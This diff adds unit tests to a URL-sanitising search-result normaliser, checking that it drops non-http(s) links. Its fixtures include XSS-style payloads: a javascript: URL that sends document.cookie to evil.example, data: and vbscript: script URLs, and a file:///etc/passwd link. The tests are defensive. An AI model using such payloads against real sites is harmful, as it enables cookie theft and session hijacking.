@@ -380,3 +380,54 @@ test("canonicalDedupeHost keeps distinct sites and registrable domains apart", (
   assert.notEqual(canonicalizeUrl("https://example.com/a"), canonicalizeUrl("https://example.com/b"));
   assert.equal(canonicalizeUrl("ftp://www.example.com/file"), "ftp://www.example.com/file");
 });
+
+test("normalizeProviderPayload discards result and citation URLs that are not http(s)", () => {
+  const normalized = normalizeProviderPayload({
+    providerId: "brave",
+    payload: {
+      content: "An answer.",
+      results: [
+        { title: "Script", url: "javascript:fetch('https://evil.example/?c='+document.cookie)" },
+        { title: "Wrapped script", url: "https://www.google.com/url?q=javascript%3Aalert(document.domain)" },
+        { title: "Data", url: "data:text/html,<script>alert(1)</script>" },
+        { title: "Local file", url: "file:///etc/passwd" },
+        { title: "Free text", url: "see the docs page" },
+        { title: "Kept", url: "http://example.com/page" },
+      ],
+      citations: ["javascript:alert(2)", { url: "vbscript:msgbox(1)", title: "x" }, "https://example.com/cited"],
+    },
+  });
+
+  // A redirect link whose target is not http(s) is kept as the wrapper URL
+  // itself (see analyzeUrl), so it is an ordinary https result.
+  assert.deepEqual(
+    normalized.results.map((result) => result.url),
+    [
+      "https://www.google.com/url?q=javascript%3Aalert(document.domain)",
+      "http://example.com/page",
+      "https://example.com/cited",
+    ],
+  );
+  assert.deepEqual(
+    normalized.discardedResults.map((entry) => [entry.reason, entry.title ?? null, entry.rawRank]),
+    [
+      ["unsupported-url", "Script", 1],
+      ["unsupported-url", "Data", 3],
+      ["unsupported-url", "Local file", 4],
+      ["unsupported-url", "Free text", 5],
+      ["unsupported-url", null, 1],
+      ["unsupported-url", "x", 2],
+    ],
+  );
+  assert.deepEqual(normalized.answer?.citations, ["https://example.com/cited"]);
+  // Surviving items keep their provider rank.
+  assert.equal(normalized.results.find((result) => result.url === "http://example.com/page")?.rawRank, 6);
+});
+
+test("normalizeProviderPayload still reports items without any URL as missing-url", () => {
+  const normalized = normalizeProviderPayload({
+    providerId: "brave",
+    payload: { results: [{ title: "No link", description: "text" }] },
+  });
+  assert.equal(normalized.discardedResults[0]?.reason, "missing-url");
+});
